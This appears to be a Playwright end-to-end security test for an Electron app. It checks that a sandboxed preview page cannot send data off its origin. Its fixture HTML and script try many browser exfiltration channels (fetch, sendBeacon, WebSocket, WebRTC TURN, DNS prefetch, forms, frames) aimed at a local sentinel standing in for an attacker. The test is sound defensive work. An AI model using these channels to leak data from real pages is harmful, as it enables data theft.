import * as dgram from "node:dgram";
import { once } from "node:events";
import * as fs from "node:fs/promises";
import * as net from "node:net";
import * as os from "node:os";
import * as path from "node:path";
import { setTimeout as sleep } from "node:timers/promises";
import { expect, test } from "@playwright/test";
import { _electron as electron } from "playwright";
import { exitApp, fixtureOmp } from "./harness";

// Security #3: a visual's page (C135) reads what its folder serves and must not
// carry it anywhere. A sentinel on 127.0.0.1 (TCP and UDP on one port) records
// every connection and packet; the visual tries every way out it has — location,
// window.open, a form, an image, CSS, prefetch, speculation rules, fetch,
// sendBeacon, <a ping>, EventSource, WebSocket, a worker, RTCPeerConnection (STUN
// over UDP, TURN over UDP and TCP), a meta refresh and frames — and the sentinel
// hears nothing, while the page still shows its own image and stylesheet. DNS
// prefetch (static, dynamic, in srcdoc and about:blank frames, with
// x-dns-prefetch-control on) must not ask the resolver for any of its names: the
// visual session's net-log shows no host resolution for them. A link the user
// clicks is offered in full and opens only when they choose to.

/** Names the page spells for a DNS prefetch; none may reach a resolver (`.invalid` never leaves the machine). */
const DNS_SUFFIX = "egress.invalid";

interface Hit {
	kind: "tcp" | "udp";
	head: string;
}

/** Records every TCP connection (and its first bytes) and UDP packet on one loopback port; answers HTTP with 204. */
async function sentinel() {
	const hits: Hit[] = [];
	const tcp = net.createServer(socket => {
		// A bare connection counts too: a preconnect or a TURN dial says something before any byte.
		const hit: Hit = { kind: "tcp", head: "" };
		hits.push(hit);
		socket.once("data", data => {
			hit.head = data.subarray(0, 120).toString("latin1");
			socket.end("HTTP/1.1 204 No Content\r\nConnection: close\r\n\r\n");
		});
		socket.on("error", () => {});
		socket.setTimeout(2000, () => socket.destroy());
	});
	// TCP and UDP have separate port spaces: the free TCP port the system hands out can be a UDP port in use (it was,
	// once in three runs here), so look for a port that is free in both rather than assume it.
	let port = 0;
	let udp: dgram.Socket | null = null;
	for (let candidate = 0; !udp && candidate < 20; candidate++) {
		tcp.listen(0, "127.0.0.1");
		await once(tcp, "listening");
		port = (tcp.address() as net.AddressInfo).port;
		const socket = dgram.createSocket("udp4");
		const bound = await new Promise<boolean>(resolve => {
			socket.once("error", () => resolve(false));
			socket.bind(port, "127.0.0.1", () => resolve(true));
		});
		if (bound) udp = socket;
		else {
			socket.close();
			tcp.close();
			await once(tcp, "close");
		}
	}
	if (!udp) throw new Error("No loopback port free for both TCP and UDP");
	const datagrams = udp;
	datagrams.on("message", data => hits.push({ kind: "udp", head: `${data.length} bytes` }));
	return {
		port,
		hits,
		close: async () => {
			tcp.close();
			datagrams.close();
			await Promise.all([once(tcp, "close"), once(datagrams, "close")]);
		},
	};
}

/** The visual: its own image and stylesheet, plus every static way out (the script tries the rest). */
const visual = (origin: string) =>
	[
		"<!doctype html><title>Egress</title>",
		'<meta http-equiv="x-dns-prefetch-control" content="on">',
		`<meta http-equiv="refresh" content="1;url=${origin}/meta-refresh?d=secret">`,
		'<link rel="stylesheet" href="style.css">',
		`<link rel="prefetch" href="${origin}/link-prefetch">`,
		`<link rel="preconnect" href="${origin}">`,
		`<link rel="dns-prefetch" href="${origin}">`,
		`<link rel="dns-prefetch" href="//secret-static.${DNS_SUFFIX}">`,
		`<iframe srcdoc='<meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="//secret-srcdoc.${DNS_SUFFIX}">'></iframe>`,
		`<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${origin}/speculation"]}]}</script>`,
		`<style>#bg { background: url(${origin}/css-url); } @font-face { font-family: x; src: url(${origin}/font); }</style>`,
		'<h1 id="title" style="font-family: x">Egress</h1>',
		'<img id="logo" src="logo.svg" alt="logo">',
		`<img src="${origin}/img-tag">`,
		'<div id="bg">bg</div>',
		`<iframe src="${origin}/iframe"></iframe>`,
		`<form id="form" action="${origin}/form" method="post"><input name="d" value="secret"></form>`,
		`<a id="link" href="${origin}/link?d=secret" ping="${origin}/ping">Read more</a>`,
	].join("\n");

/** Run in the page's main world, as its own script would. */
const ATTEMPTS = (origin: string) => `(async () => {
	const S = ${JSON.stringify(origin)};
	const swallow = action => { try { const out = action(); if (out && out.catch) out.catch(() => {}); } catch {} };
	swallow(() => { location.href = S + "/location?d=secret"; });
	swallow(() => window.open(S + "/window-open?d=secret"));
	swallow(() => { const a = document.createElement("a"); a.href = S + "/target-blank"; a.target = "_blank"; document.body.append(a); a.click(); });
	swallow(() => { const a = document.createElement("a"); a.href = S + "/download"; a.download = "x.txt"; document.body.append(a); a.click(); });
	swallow(() => document.getElementById("form").submit());
	swallow(() => { const image = new Image(); image.src = S + "/image"; document.body.append(image); });
	swallow(() => { const link = document.createElement("link"); link.rel = "prefetch"; link.href = S + "/dynamic-prefetch"; document.head.append(link); });
	swallow(() => { const link = document.createElement("link"); link.rel = "dns-prefetch"; link.href = "//secret-dynamic.${DNS_SUFFIX}"; document.head.append(link); });
	swallow(() => {
		const frame = document.createElement("iframe");
		document.body.append(frame);
		const inner = frame.contentDocument;
		const control = inner.createElement("meta"); control.httpEquiv = "x-dns-prefetch-control"; control.content = "on"; inner.head.append(control);
		const link = inner.createElement("link"); link.rel = "dns-prefetch"; link.href = "//secret-blank.${DNS_SUFFIX}"; inner.head.append(link);
	});
	swallow(() => fetch(S + "/fetch?d=secret", { method: "POST", mode: "no-cors", body: "secret" }));
	swallow(() => navigator.sendBeacon(S + "/beacon", "secret"));
	swallow(() => new EventSource(S + "/event-source"));
	swallow(() => new WebSocket(S.replace("http", "ws") + "/socket"));
	swallow(() => new Worker(URL.createObjectURL(new Blob(["fetch(" + JSON.stringify(S + "/worker") + ").catch(() => {})"], { type: "text/javascript" }))));
	swallow(() => { const meta = document.createElement("meta"); meta.httpEquiv = "refresh"; meta.content = "0;url=" + S + "/dynamic-refresh"; document.head.append(meta); });
	swallow(() => { const frame = document.createElement("iframe"); frame.src = S + "/dynamic-iframe"; document.body.append(frame); });
	// An empty frame of the page's own origin: its window navigates itself and the top.
	swallow(() => {
		const frame = document.createElement("iframe");
		document.body.append(frame);
		swallow(() => { frame.contentWindow.location.href = S + "/blank-frame"; });
		swallow(() => { frame.contentWindow.top.location.href = S + "/frame-top"; });
	});
	// WebRTC from a fresh realm (an empty frame's), which no page-side patch could reach.
	const holder = document.createElement("iframe");
	document.body.append(holder);
	const RTC = holder.contentWindow.RTCPeerConnection;
	const host = S.replace("http://", "");
	const peer = new RTC({ iceServers: [
		{ urls: "stun:" + host },
		{ urls: "turn:" + host + "?transport=udp", username: "secret", credential: "x" },
		{ urls: "turn:" + host + "?transport=tcp", username: "secret", credential: "x" },
	] });
	peer.createDataChannel("out");
	await peer.setLocalDescription(await peer.createOffer());
	return "tried";
})()`;

test("a visual's page sends nothing off its own origin; a clicked link opens only on the user's choice", async () => {
	test.setTimeout(120_000);
	const listener = await sentinel();
	const origin = `http://127.0.0.1:${listener.port}`;
	const profile = await fs.mkdtemp(path.join(os.tmpdir(), "omp-visual-egress-"));
	const desktop = path.join(profile, "desktop");
	const project = path.join(profile, "project");
	const agent = path.join(profile, "agent");
	const record = path.join(profile, "record.jsonl");
	await Promise.all([fs.mkdir(desktop), fs.mkdir(project), fs.mkdir(agent)]);
	await fs.writeFile(
		path.join(desktop, "prefs.json"),
		JSON.stringify({ language: "en", themeName: "light", firstRunComplete: true }),
	);
	await fs.writeFile(path.join(project, "egress.html"), visual(origin));
	await fs.writeFile(path.join(project, "style.css"), "h1 { color: rgb(51, 102, 255); }");
	await fs.writeFile(
		path.join(project, "logo.svg"),
		'<svg xmlns="http://www.w3.org/2000/svg" width="40" height="20"><rect width="40" height="20" fill="red"/></svg>',
	);
	await fs.writeFile(path.join(project, "secrets.json"), '{"token":"secret"}');
	const env = {
		...process.env,
		OMP_GUI_HEADLESS: "1",
		PI_CODING_AGENT_DIR: agent,
		OMP_GUI_OMP: await fixtureOmp(profile),
		OMP_GUI_TEST_RECORD: record,
	};
	Reflect.deleteProperty(env, "ELECTRON_RUN_AS_NODE");
	const app = await electron.launch({
		args: [
			path.resolve(process.env.OMP_GUI_E2E_OUT ?? "out", "main/index.js"),
			project,
			`--user-data-dir=${desktop}`,
		],
		env,
	});
	const shell = await app.firstWindow();
	/** Run in the visual's page (its main world), found by its omp-visual address. */
	const inPage = (code: string) =>
		app.evaluate(async ({ webContents }, source) => {
			const contents = webContents.getAllWebContents().find(item => item.getURL().startsWith("omp-visual://"));
			if (!contents) throw new Error("No visual page");
			return contents.executeJavaScript(source, true);
		}, code);
	try {
		await shell.waitForFunction(() => window.omp?.rpc != null);
		await expect
			.poll(async () => (await shell.evaluate(() => window.omp.sidecar.getStatus())).status, { timeout: 60_000 })
			.toBe("ready");
		// The visual session's network log, from before the page loads: every host name it is asked to resolve.
		const netLog = path.join(profile, "visual-net-log.json");
		await app.evaluate(async ({ BrowserWindow, session }, file) => {
			const [win] = BrowserWindow.getAllWindows();
			if (!win) throw new Error("No window");
			await session.fromPartition(`preview-visual-${win.id}`).netLog.startLogging(file);
		}, netLog);
		const composer = shell.locator("textarea").first();
		await composer.fill(
			`!fixture:host-tool:gui_visualize ${JSON.stringify({ action: "open", target: "egress.html" })}`,
		);
		await composer.press("Enter");
		const aside = shell.locator("aside[data-docked]");
		await expect(shell.locator("[data-preview-status]")).toHaveText("Egress");
		// The page reads what its folder serves; that is what it would try to send.
		expect(await inPage("fetch('secrets.json').then(response => response.text())")).toBe('{"token":"secret"}');

		expect(await inPage(ATTEMPTS(origin))).toBe("tried");
		// Long enough for the meta refresh (1 s), ICE gathering and every retry.
		await sleep(5000);
		expect(listener.hits).toEqual([]);
		// No DNS prefetch asked for a name; a resolution main itself asks for is in the log, so the log would show one.
		await app.evaluate(async ({ BrowserWindow, session }, suffix) => {
			const [win] = BrowserWindow.getAllWindows();
			const visual = session.fromPartition(`preview-visual-${win?.id}`);
			await visual.resolveHost(`control.${suffix}`).catch(() => {});
			await visual.netLog.stopLogging();
		}, DNS_SUFFIX);
		const resolved = new Set((await fs.readFile(netLog, "utf8")).match(/[a-z-]+\.egress\.invalid/g));
		expect([...resolved]).toEqual([`control.${DNS_SUFFIX}`]);

		// The visual is still there, with its own assets.
		const urls = await app.evaluate(({ webContents }) => webContents.getAllWebContents().map(item => item.getURL()));
		expect(urls.filter(url => url.startsWith("omp-visual://"))).toHaveLength(1);
		expect(urls.some(url => url.startsWith(origin))).toBe(false);
		expect(await inPage("location.href")).toMatch(/^omp-visual:\/\/v1-[0-9a-f]{16}\/egress\.html$/);
		expect(await inPage("document.getElementById('logo').naturalWidth")).toBe(40);
		expect(await inPage("getComputedStyle(document.getElementById('title')).color")).toBe("rgb(51, 102, 255)");

		// A real click on its link: refused (its ping too), and offered with the whole address.
		await app.evaluate(async ({ webContents }) => {
			const contents = webContents.getAllWebContents().find(item => item.getURL().startsWith("omp-visual://"));
			if (!contents) throw new Error("No visual page");
			const box = (await contents.executeJavaScript(
				"(() => { const r = document.getElementById('link').getBoundingClientRect(); return { x: r.left + r.width / 2, y: r.top + r.height / 2 }; })()",
			)) as { x: number; y: number };
			const factor = contents.getZoomFactor();
			const x = Math.round(box.x * factor);
			const y = Math.round(box.y * factor);
			contents.sendInputEvent({ type: "mouseMove", x, y });
			contents.sendInputEvent({ type: "mouseDown", x, y, button: "left", clickCount: 1 });
			contents.sendInputEvent({ type: "mouseUp", x, y, button: "left", clickCount: 1 });
		});
		const offer = aside.locator("[data-preview-link]");
		await expect(offer).toHaveAttribute("data-preview-link", `${origin}/link?d=secret`);
		await expect(offer).toContainText(`${origin}/link?d=secret`);
		await sleep(1000);
		expect(listener.hits).toEqual([]);
		expect(await inPage("location.href")).toMatch(/egress\.html$/);

		// The user chooses to open it: a new web tab fetches exactly that address.
		await aside.getByRole("button", { name: "Open in new tab", exact: true }).click();
		await expect
			.poll(() => listener.hits.map(hit => hit.head.split("\r\n")[0]))
			.toContain("GET /link?d=secret HTTP/1.1");
		await expect(offer).toHaveCount(0);
		expect(await inPage("location.href")).toMatch(/egress\.html$/);
	} finally {
		await exitApp(app);
		await listener.close();
		await fs.rm(profile, { recursive: true, force: true });
	}
});
